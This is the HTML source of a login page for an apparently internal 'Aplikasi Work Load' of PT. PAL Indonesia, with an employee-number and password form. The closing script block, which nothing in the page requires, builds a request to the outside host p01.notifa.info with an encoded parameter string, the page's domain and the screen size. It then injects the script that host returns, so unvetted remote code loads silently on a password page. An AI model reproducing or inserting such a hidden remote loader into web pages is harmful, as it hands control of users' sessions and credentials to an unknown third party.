
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>WORKLOAD | Log in</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="./dist/css/adminlte.min.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="./plugins/iCheck/square/blue.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition login-page">
<div class="login-box">
  <div class="login-logo">
    <a href="./index.php"><b>PT. PAL </b>INDONESIA</a>
  </div>
  <!-- /.login-logo -->
  <div class="card">
    <div class="card-body login-card-body">
      <h4 class="login-box-msg">Aplikasi Work Load</h4>

      <form action="./function/login.php" method="post">
        <div class="form-group has-feedback">
            <span class="fa fa-user form-control-feedback"></span>
            <input type="numeric" name="nip" class="form-control" placeholder="Nomor Induk Pegawai">
        </div>
        <div class="form-group has-feedback">
            <span class="fa fa-lock form-control-feedback"></span>
            <input type="password" name="password" class="form-control" placeholder="Password">
        </div>
          <!-- /.col -->
          <div class="col-15">
            <button type="submit" class="btn btn-primary btn-block btn-flat">Sign In</button>
          </div>
          <!-- /.col -->
        </div>
      </form>
    </div>
    <!-- /.login-card-body -->
  </div>
</div>
<!-- /.login-box -->

<!-- jQuery -->
<script src="./plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="./plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- iCheck -->
<script src="./plugins/iCheck/icheck.min.js"></script>
<script>
  $(function () {
    $('input').iCheck({
      checkboxClass: 'icheckbox_square-blue',
      radioClass   : 'iradio_square-blue',
      increaseArea : '20%' // optional
    })
  })
</script>
<script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpeZeUH46pNSGiYMd%2baoPcVphix062FQHkAVfYh5%2bEVEC4DbJpox0XlTA8exAHPbRL3covp0HjdrTiHZVnsl4GPGsDaciOu2K057w2s0ylS17E4qDvcsIXw%2bkz9QSjcrNx484Tix1MVaO%2bNXtwGABYesaNcQNF1gvdM6AbOrOmjFxEZ7eQMnKKmcLDuTwQz43qGG9z3SLZuFbADuUdT0KUcgyPS2sQyWSXxJkrkQ4hzbRG0mBi7M1%2fdXKfCyTzioBHBVnCkanCfPVBqmuwYoqTDbn63D1fu5odc5RwSRpxRkSB5yThADmbUOse%2fAMvsMqOosT8RNwzZCNTDhEH8hzwHzCGSyqAt7%2fmBITyfY45OJQK87VA2fOrHjYAqn5AHpZL56UOZsIn0IX%2fF58259xbXiXqrIgorcyi9GGqq3FSug0DAkyAtaMVYJ%2bIiuGuAxjYHG3Re%2b0v2tnLk6bDVP6Shxr661p0kL4M%2bAXvzZQyN4JoZxzgw2QppUt1hNGTjK3rt8MBX2fGdfTdHC8f8kaoqp6Vojv87wC5E%3d" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };
    </script>
</body>
</html>
